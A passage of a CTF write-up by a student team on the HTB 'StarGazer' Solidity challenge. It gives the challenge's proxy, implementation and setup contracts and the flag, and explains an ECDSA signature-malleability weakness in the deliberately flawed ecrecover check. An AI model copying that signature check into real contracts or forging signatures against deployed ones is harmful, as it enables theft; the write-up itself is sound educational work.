@@ -1,0 +1,366 @@
+
+									
+
+In mid-December, our school team, Phreaks 2600, participated in the HTB University CTF. Among the challenges featured in the competition was one titled “StarGazer,” classified as the Hard challenge of the Blockchain category. This challenge focused on Solidity and explored the concepts of UUPSUpgradeable and ERC1967Proxy mechanisms.
+<ul>
+<li><strong>Category:</strong> Blockchain</li>
+<li><strong>Difficulty:</strong> Hard</li>
+<li><strong>Info provided:</strong> Setup.sol / Stargazer.sol (Proxy) / StargazerKernel.sol (Implementation)</li>
+<li><strong>Flag:</strong> <code>HTB{stargazer_f1nds_s0l4c3_ag41n}</code></li>
+</ul> 
+<h2 id="section-1">Files</h2> 
+<p><strong>Setup.sol</strong></p> <pre data-language="solidity"><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import { Stargazer } from "./Stargazer.sol";
+import { StargazerKernel } from "./StargazerKernel.sol";
+
+contract Setup {
+    Stargazer public immutable TARGET_PROXY;
+    StargazerKernel public immutable TARGET_IMPL;
+
+    event DeployedTarget(address proxy, address implementation);
+
+    constructor(bytes memory signature) payable {
+        TARGET_IMPL = new StargazerKernel();
+        
+        string[] memory starNames = new string[](1);
+        starNames[0] = "Nova-GLIM_007";
+        bytes memory initializeCall = abi.encodeCall(TARGET_IMPL.initialize, starNames);
+        TARGET_PROXY = new Stargazer(address(TARGET_IMPL), initializeCall);
+        
+        bytes memory createPASKATicketCall = abi.encodeCall(TARGET_IMPL.createPASKATicket, (signature));
+        (bool success, ) = address(TARGET_PROXY).call(createPASKATicketCall);
+        require(success);
+
+        string memory starName = "Starry-SPURR_001";
+        bytes memory commitStarSightingCall = abi.encodeCall(TARGET_IMPL.commitStarSighting, (starName));
+        (success, ) = address(TARGET_PROXY).call(commitStarSightingCall);
+        require(success);
+
+        emit DeployedTarget(address(TARGET_PROXY), address(TARGET_IMPL));
+    }
+
+    function isSolved() public returns (bool) {
+        bool success;
+        bytes memory getStarSightingsCall;
+        bytes memory returnData;
+
+        getStarSightingsCall = abi.encodeCall(TARGET_IMPL.getStarSightings, ("Nova-GLIM_007"));
+        (success, returnData) = address(TARGET_PROXY).call(getStarSightingsCall);
+        require(success, "Setup: failed external call.");
+        uint256[] memory novaSightings = abi.decode(returnData, (uint256[]));
+        
+        getStarSightingsCall = abi.encodeCall(TARGET_IMPL.getStarSightings, ("Starry-SPURR_001"));
+        (success, returnData) = address(TARGET_PROXY).call(getStarSightingsCall);
+        require(success, "Setup: failed external call.");
+        uint256[] memory starrySightings = abi.decode(returnData, (uint256[]));
+        
+        return (novaSightings.length &gt;= 2 &amp;&amp; starrySightings.length &gt;= 2);
+    }
+}
+</code></pre>
+<p><span data-token-index="0">Stargazer</span><strong>.sol</strong></p> <pre data-language="solidity"><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
+
+contract Stargazer is ERC1967Proxy {
+    constructor(address _implementation, bytes memory _data) ERC1967Proxy(_implementation, _data) {}
+}
+
+/**************************************************************************
+    a lonely machine in a lonely world looking a lonely shooting star...   
+***************************************************************************
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣭⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⠤⢤⣀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠒⢋⣉⣀⣠⣄⣀⣈⡇⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣯⠴⠚⠉⠉⠀⠀⠀⠀⣤⠏⣿⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⡇⠁⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⡿⠿⢛⠁⠁⣸⠀⠀⠀⠀⠀⣤⣾⠵⠚⠁⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢦⡀⠀⣠⠀⡇⢧⠀⠀⢀⣠⡾⡇⠀⠀⠀⠀⠀⣠⣴⠿⠋⠁⠀⠀⠀⠀⠘⣿⠀⣀⡠⠞⠛⠁⠂⠁⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⣻⡦⣞⡿⣷⠸⣄⣡⢾⡿⠁⠀⠀⠀⣀⣴⠟⠋⠁⠀⠀⠀⠀⠐⠠⡤⣾⣙⣶⡶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣂⡷⠰⣔⣾⣖⣾⡷⢿⣐⣀⣀⣤⢾⣋⠁⠀⠀⠀⣀⢀⣀⣀⣀⣀⠀⢀⢿⠑⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠠⡦⠴⠴⠤⠦⠤⠤⠤⠤⠤⠴⠶⢾⣽⣙⠒⢺⣿⣿⣿⣿⢾⠶⣧⡼⢏⠑⠚⠋⠉⠉⡉⡉⠉⠉⠹⠈⠁⠉⠀⠨⢾⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠂⠐⠀⠀⠀⠈⣇⡿⢯⢻⣟⣇⣷⣞⡛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣆⠀⠀⠀⠀⢠⡷⡛⣛⣼⣿⠟⠙⣧⠅⡄⠀⠀⠀⠀⠀⠀⠰⡆⠀⠀⠀⠀⢠⣾⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⢶⠏⠉⠀⠀⠀⠀⠀⠿⢠⣴⡟⡗⡾⡒⠖⠉⠏⠁⠀⠀⠀⠀⣀⢀⣠⣧⣀⣀⠀⠀⠀⠚⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣠⢴⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⣠⣷⢿⠋⠁⣿⡏⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣿⢭⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢀⡴⢏⡵⠛⠀⠀⠀⠀⠀⠀⠀⣀⣴⠞⠛⠀⠀⠀⠀⢿⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⢿⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣀⣼⠛⣲⡏⠁⠀⠀⠀⠀⠀⢀⣠⡾⠋⠉⠀⠀⠀⠀⠀⠀⢾⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⡴⠟⠀⢰⡯⠄⠀⠀⠀⠀⣠⢴⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⡾⠁⠁⠀⠘⠧⠤⢤⣤⠶⠏⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠘⣇⠂⢀⣀⣀⠤⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢼⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+***************************************************************************
+    ...wondering if it will get the chance to witness it again.            
+**************************************************************************/</code></pre>
+<p><span data-token-index="0">StargazerKernel</span><strong>.sol</strong></p> <pre data-language="solidity"><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+
+contract StargazerKernel is UUPSUpgradeable {
+    // keccak256(abi.encode(uint256(keccak256("htb.storage.Stargazer")) - 1)) &amp; ~bytes32(uint256(0xff));
+    bytes32 private constant __STARGAZER_MEMORIES_LOCATION = 0x8e8af00ddb7b2dfef2ccc4890803445639c579a87f9cda7f6886f80281e2c800;
+    
+    /// @custom:storage-location erc7201:htb.storage.Stargazer
+    struct StargazerMemories {
+        uint256 originTimestamp; 
+        mapping(bytes32 =&gt; uint256[]) starSightings;
+        mapping(bytes32 =&gt; bool) usedPASKATickets;
+        mapping(address =&gt; KernelMaintainer) kernelMaintainers;
+    }
+
+    struct KernelMaintainer {
+        address account;
+        PASKATicket[] PASKATickets;
+        uint256 PASKATicketsNonce;
+    }
+
+    struct PASKATicket {
+        bytes32 hashedRequest;
+        bytes signature;
+    }
+
+
+    event PASKATicketCreated(PASKATicket ticket);
+    event StarSightingRecorded(string starName, uint256 sightingTimestamp);
+    event AuthorizedKernelUpgrade(address newImplementation);
+
+    function initialize(string[] memory _pastStarSightings) public initializer onlyProxy {
+        StargazerMemories storage $ = _getStargazerMemory();
+        $.originTimestamp = block.timestamp;
+        $.kernelMaintainers[tx.origin].account = tx.origin;
+        for (uint256 i = 0; i  0, "StargazerKernel: no active PASKA tickets.");
+        PASKATicket memory ticket = activePASKATickets[activePASKATickets.length - 1];
+        bytes32 ticketId = keccak256(abi.encode(ticket));
+        $.usedPASKATickets[ticketId] = true;
+        activePASKATickets.pop();
+        return ticket;
+    }
+
+    function _verifyPASKATicket(PASKATicket memory _ticket) internal view onlyProxy {
+        StargazerMemories storage $ = _getStargazerMemory();
+        address signer = _recoverSigner(_ticket.hashedRequest, _ticket.signature);
+        require(_isKernelMaintainer(signer), "StargazerKernel: signer is not a StargazerKernel maintainer.");
+        bytes32 ticketId = keccak256(abi.encode(_ticket));
+        require(!$.usedPASKATickets[ticketId], "StargazerKernel: PASKA ticket already used.");
+    }
+
+    function _recoverSigner(bytes32 _message, bytes memory _signature) internal view onlyProxy returns (address) {
+        require(_signature.length == 65, "StargazerKernel: invalid signature length.");
+        bytes32 r;
+        bytes32 s;
+        uint8 v;
+        assembly ("memory-safe") {
+            r := mload(add(_signature, 0x20))
+            s := mload(add(_signature, 0x40))
+            v := byte(0, mload(add(_signature, 0x60)))
+        }
+        require(v == 27 || v == 28, "StargazerKernel: invalid signature version");
+        address signer = ecrecover(_message, v, r, s);
+        require(signer != address(0), "StargazerKernel: invalid signature.");
+        return signer;
+    }
+
+    function _isKernelMaintainer(address _account) internal view onlyProxy returns (bool) {
+        StargazerMemories storage $ = _getStargazerMemory();
+        return $.kernelMaintainers[_account].account == _account;
+    }
+
+    function _prefixed(bytes32 hash) internal pure returns (bytes32) {
+        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
+    }
+}</code></pre>
+<h2 id="section-2">Code Analysis</h2> 
+<p><strong>Setup Contract</strong></p><p>The <code data-token-index="1">Setup</code> contract is the starting point of the system. It deploys the <code data-token-index="3">StargazerKernel</code> implementation and a <code data-token-index="5">Stargazer</code> proxy contract, linking them during initialization. It sets up initial data such as star sightings and ensures the system is configured for interaction.</p><p>In the constructor, the <code data-token-index="1">initialize</code> function is called on the <code data-token-index="3">StargazerKernel</code> implementation via the proxy to record the initial star sightings. Then, the <code data-token-index="5">createPASKATicket</code> and <code data-token-index="7">commitStarSighting</code> functions are called to create PASKATickets and add star sightings, respectively:</p> <pre data-language="solidity"><code>...
+
+bytes memory initializeCall = abi.encodeCall(TARGET_IMPL.initialize, starNames);
+TARGET_PROXY = new Stargazer(address(TARGET_IMPL), initializeCall);
+
+bytes memory createPASKATicketCall = abi.encodeCall(TARGET_IMPL.createPASKATicket, (signature));
+(bool success, ) = address(TARGET_PROXY).call(createPASKATicketCall);
+
+string memory starName = "Starry-SPURR_001";
+bytes memory commitStarSightingCall = abi.encodeCall(TARGET_IMPL.commitStarSighting, (starName));
+(success, ) = address(TARGET_PROXY).call(commitStarSightingCall);
+
+...</code></pre>
+<p>The <code data-token-index="1">isSolved</code> function determines if the challenge conditions are met by checking that two specific stars each have at least two recorded sightings. It uses calls to the proxy to retrieve these records:</p> <pre data-language="solidity"><code>...
+(success, returnData) = address(TARGET_PROXY).call(getStarSightingsCall);
+uint256[] memory novaSightings = abi.decode(returnData, (uint256[]));
+...
+uint256[] memory starrySightings = abi.decode(returnData, (uint256[]));
+
+return (novaSightings.length &gt;= 2 &amp;&amp; starrySightings.length &gt;= 2);       &lt;----- win condition
+</code></pre>
+<p><strong><span data-token-index="0">Stargazer Proxy<br/></span></strong></p><p>The <code data-token-index="1">Stargazer</code> contract inherits from OpenZeppelin’s <code data-token-index="3">ERC1967Proxy</code> and acts as a gateway for all interactions with the <code data-token-index="5">StargazerKernel</code> implementation. It delegates calls to the implementation contract and supports upgradeability using the UUPS pattern.</p><p>The proxy’s constructor initializes it by taking the address of the implementation and any initialization data:</p> <pre data-language="solidity"><code>constructor(address _implementation, bytes memory _data) ERC1967Proxy(_implementation, _data) {}
+</code></pre>
+<p>This setup ensures that the system can evolve by upgrading the logic contract while preserving state in the proxy.</p> 
+<p><strong><span data-token-index="0">StargazerKernel Implementation</span></strong></p><p>The <code data-token-index="1">StargazerKernel</code> is where the core logic resides. It handles the functionality for managing star sightings and maintains a registry of PASKATickets and kernel maintainers.</p> 
+<p><strong><span data-token-index="0">Initialization</span></strong></p><p>The <code data-token-index="1">initialize</code> function sets the origin timestamp and records any predefined star sightings. It ensures that only the proxy can call it, (only <code data-token-index="3">one</code> time with the initializer modifier), by using the <code data-token-index="5">onlyProxy</code> modifier:</p> <pre data-language="solidity"><code>function initialize(string[] memory _pastStarSightings)
+    public initializer onlyProxy {
+    ...
+}
+</code></pre>
+<p><strong><span data-token-index="0">PASKATicket Management</span></strong></p><p>PASKATickets grant users privileges such as recording sightings or upgrading the contract. They are created using the <code data-token-index="1">createPASKATicket</code> function, which validates a provided signature:</p> <pre data-language="solidity"><code>function createPASKATicket(bytes memory _signature) public onlyProxy {
+    ...
+    _verifyPASKATicket(newTicket);
+    emit PASKATicketCreated(newTicket);
+}
+</code></pre>
+<p>The <code data-token-index="1">_verifyPASKATicket</code> function checks the signature by recovering the signer’s address using <code data-token-index="3">_recoverSigner</code>, which is susceptible to ECDSA signature forgery (we will see later):</p> <pre data-language="solidity"><code>address signer = _recoverSigner(_ticket.hashedRequest, _ticket.signature);
+require(_isKernelMaintainer(signer), "StargazerKernel: signer is not a maintainer.");
+</code></pre>
+<p><strong>Recording Star Sightings</strong></p><p>Star sightings are recorded with <code data-token-index="1">commitStarSighting</code>, which adds a timestamp for a given star. The star’s name is hashed to generate a unique identifier:</p> <pre data-language="solidity"><code>...
+PASKATicket memory starSightingCommitRequest = _consumePASKATicket(author);
+...
+bytes32 starId = keccak256(abi.encodePacked(_starName));
+$.starSightings[starId].push(sightingTimestamp);
+...</code></pre>
+<p>This function requires a valid PASKATicket to execute, <code data-token-index="1">consumePASKATicket</code> function includes a crucial verification step to ensure that only valid and active PASKATickets are consumed. It first retrieves the <code data-token-index="3">KernelMaintainer</code> storage for the specified maintainer address and accesses their list of active tickets. The function requires that the maintainer has at least one active ticket, enforced by the check:</p> <pre data-language="solidity"><code>require(activePASKATickets.length &gt; 0, "StargazerKernel: no active PASKA tickets.");
+</code></pre>
+<p>If no tickets are available, the function reverts, preventing unauthorized actions. This adds a layer of security by ensuring that each PASKATicket represents a valid authorization and hasn’t been depleted by previous actions.</p> 
+<p><strong>Authorize Upgrade</strong></p><p>The <code data-token-index="1">_authorizeUpgrade</code> function leverages the <code data-token-index="3">consumePASKATicket</code> mechanism to validate upgrades to the proxy’s implementation. When this function is invoked, it retrieves the address of the transaction origin (<code data-token-index="5">tx.origin</code>) and attempts to consume a valid PASKATicket for the upgrade action. If the ticket is successfully consumed, the function proceeds to emit the <code data-token-index="7">AuthorizedKernelUpgrade</code> event:</p> <pre data-language="solidity"><code>PASKATicket memory kernelUpdateRequest = _consumePASKATicket(issuer);
+emit AuthorizedKernelUpgrade(_newImplementation);
+</code></pre>
+<p>This ensures that only authorized maintainers with valid PASKATickets can perform upgrades, safeguarding the contract from unauthorized modifications. The use of <code data-token-index="1">_consumePASKATicket</code> ties the upgrade authorization to the ticket-based privilege system, reinforcing the access control mechanism.</p> 
+<h2 id="section-3">How to upgrade an UUPSUpgradeable contract</h2> 
+<p>The implementation of an <code data-token-index="1">UUPSUpgradeable</code> contract (like <code data-token-index="3">StargazerKernel.sol</code>) inherit the following function:</p> <pre data-language="solidity"><code>    /**
+     * @dev Upgrade the implementation of the proxy to `newImplementation`, and subsequently execute the function call
+     * encoded in `data`.
+     *
+     * Calls {_authorizeUpgrade}.
+     *
+     * Emits an {Upgraded} event.
+     *
+     * @custom:oz-upgrades-unsafe-allow-reachable delegatecall
+     */
+    function upgradeToAndCall(address newImplementation, bytes memory data) public payable virtual onlyProxy {
+        _authorizeUpgrade(newImplementation);
+        _upgradeToAndCallUUPS(newImplementation, data);
+    }</code></pre>
+<p>The implementation of an <code data-token-index="1">UUPSUpgradeable</code> contract (like <code data-token-index="3">StargazerKernel.sol</code>) inherit the following function:</p><ul><li><code data-token-index="0">newImplementation</code>: The address of the new logic contract.</li><li><code data-token-index="0">data</code>: The encoded function call to execute on the new implementation (optional; can be empty).</li></ul><div>The function begins by calling <code data-token-index="1">_authorizeUpgrade</code>, which is a security measure ensuring that only authorized entities can perform the upgrade. This function must be implemented by the inheriting contract, and in <code data-token-index="3">StargazerKernel</code>, it relies on the presence of a valid PASKATicket for authorization:</div> <pre data-language="solidity"><code>_authorizeUpgrade(newImplementation);</code></pre>
+<p>Once authorization is granted, the function delegates to <code data-token-index="1">_upgradeToAndCallUUPS</code>, which performs the actual upgrade by changing the proxy’s implementation address to <code data-token-index="3">newImplementation</code>. If <code data-token-index="5">data</code> is provided, it is executed as a <code data-token-index="7">delegatecall</code> on the new implementation, allowing immediate interaction with the new contract logic:</p> <pre data-language="solidity"><code>_upgradeToAndCallUUPS(newImplementation, data);
+</code></pre>
+<p>Finally, the function emits an <code data-token-index="1">Upgraded</code> event to signal that the upgrade was successful. The combination of an upgrade and an optional function call makes this method powerful but potentially dangerous if the <code data-token-index="3">_authorizeUpgrade</code> logic is weak or exploited, as it directly affects the contract’s behavior and state.</p> 
+<h2 id="section-4">Goal</h2> 
+<p>The <span data-token-index="1">goal</span> of the challenge is to ensure that the <code data-token-index="3">Stargazer</code> proxy, which implements the <code data-token-index="5">StargazerKernel</code> logic, returns an array containing at least two elements for each of the stars “Nova-GLIM_007” and “Starry-SPURR_001” when the <code data-token-index="7">getStarSightings</code> function is called. This requires the <code data-token-index="9">starSightings</code> mapping in the <code data-token-index="11">StargazerKernel</code> contract to store at least two timestamps for the respective star names. Achieving this would satisfy the conditions checked by the <code data-token-index="13">isSolved</code> function in the <code data-token-index="15">Setup</code> contract.</p> 
+<p><strong>Main idea</strong></p><p>The <span data-token-index="1">challenge</span> lies in how to populate the required entries in the <code data-token-index="3">starSightings</code> mapping. One approach is to upgrade the proxy contract to point to a new implementation crafted specifically to meet the <code data-token-index="5">isSolved</code> criteria. Alternatively, one can invoke the <code data-token-index="7">commitStarSighting</code> function for the specified star names (“Nova-GLIM_007” and “Starry-SPURR_001”), which appends new sightings to the mapping. However, both approaches require privileges typically reserved for maintainers, necessitating the creation of a valid PASKATicket to bypass the restrictions.</p> 
+<p><strong>Interesting other points</strong></p><p>Key <strong>information</strong> is available through the events emitted by <code>Setup.sol</code>, which include:</p><ul><li><code data-token-index="0">PASKATicketCreated(newTicket)</code>: Indicates the successful creation of a PASKATicket, which can grant maintainer privileges. So we can retrieve an old ticket (already used) and its <span data-token-index="2">signature</span>.</li></ul><div><span data-token-index="0">      <img alt="⚠️" class="emoji" height="36" loading="lazy" src="image-01.svg" width="36"/> The signature will play an important role for the resolution of this challenge !</span></div><div><span data-token-index="0"> </span></div><ul><li><code data-token-index="0">StarSightingRecorded(_starName, sightingTimestamp)</code>: Confirms that a new star sighting has been recorded in the system.</li><li><code data-token-index="0">DeployedTarget(address(TARGET_PROXY), address(TARGET_IMPL))</code>: Logs the addresses of the deployed proxy and implementation contracts.</li></ul> 
+<h2 id="section-5">Vulnerability</h2> 
+<p>From here, now we only have 3 entry points where we can modify the state of the proxy contract <code data-token-index="1">Stargazer</code> :</p><ol><li><code data-token-index="0">function createPASKATicket(bytes memory _signature) public onlyProxy</code></li><li><code data-token-index="0">function commitStarSighting(string memory _starName) public onlyProxy</code></li><li><code data-token-index="0">function upgradeToAndCall(address newImplementation, bytes memory data) public payable virtual onlyProxy</code></li></ol><div><p><span data-token-index="0">Unfortunately both of them </span><code data-token-index="1">commitStarSighting</code><span data-token-index="2"> and </span><code data-token-index="3">upgradeToAndCall</code><span data-token-index="4"> consume a ticket </span>which prevent us to fully execute the function.</p><p><span data-token-index="0">A key part of analyzing the implementation contract (StargazerKernel.sol) was recognizing the significance of the </span><code data-token-index="1">createPASKATicket</code><span data-token-index="2"> function, as it acts as a gatekeeper for obtaining the necessary privileges to interact with critical functions like </span><code data-token-index="3">commitStarSighting</code><span data-token-index="4"> or upgrading the proxy. Within </span><code data-token-index="5">createPASKATicket</code><span data-token-index="6">, the </span><code data-token-index="7">_verifyPASKATicket</code><span data-token-index="8"> function is called to validate the signature associated with a PASKATicket:</span></p></div> <pre data-language="solidity"><code>function createPASKATicket(bytes memory _signature) public onlyProxy {
+        StargazerMemories storage $ = _getStargazerMemory();
+        uint256 nonce = $.kernelMaintainers[tx.origin].PASKATicketsNonce;
+        bytes32 hashedRequest = _prefixed(
+            keccak256(abi.encodePacked("PASKA: Privileged Authorized StargazerKernel Action", nonce))
+        );
+        PASKATicket memory newTicket = PASKATicket(hashedRequest, _signature);
+-----&gt;  _verifyPASKATicket(newTicket);  &lt;----------------
+        $.kernelMaintainers[tx.origin].PASKATickets.push(newTicket);
+        $.kernelMaintainers[tx.origin].PASKATicketsNonce++;
+        emit PASKATicketCreated(newTicket);
+    }</code></pre>
+<p>Upon further inspection of <code data-token-index="1">_verifyPASKATicket</code>, it became clear that its logic relies on the <code data-token-index="3">_recoverSigner</code> function, which uses <code data-token-index="5">ecrecover</code> to extract the signer’s address from the signature:</p> <pre data-language="solidity"><code>    function _recoverSigner(bytes32 _message, bytes memory _signature) internal view onlyProxy returns (address) {
+        require(_signature.length == 65, "StargazerKernel: invalid signature length.");
+        bytes32 r;
+        bytes32 s;
+        uint8 v;
+        assembly ("memory-safe") {
+            r := mload(add(_signature, 0x20))
+            s := mload(add(_signature, 0x40))
+            v := byte(0, mload(add(_signature, 0x60)))
+        }
+        require(v == 27 || v == 28, "StargazerKernel: invalid signature version");
+------&gt; address signer = ecrecover(_message, v, r, s); &lt;----------------------
+        require(signer != address(0), "StargazerKernel: invalid signature.");
+        return signer;
+    </code></pre>
+<p><strong>ECDSA malleability attack</strong></p><p>The requirement that the signer must be a maintainer seemed to block unauthorized users. So, we dove deeper into <code data-token-index="1">_recoverSigner</code>, and it turned out that <code data-token-index="3">ecrecover</code> is susceptible to an <a data-token-index="5" href="https://docs.soliditylang.org/en/latest/units-and-global-variables.html#mathematical-and-cryptographic-functions" rel="noopener noreferrer" target="_blank"><span>already known vulnerability</span></a></p> 
+<img alt="" height="707" loading="lazy" src="image-02.png" width="949"/> 
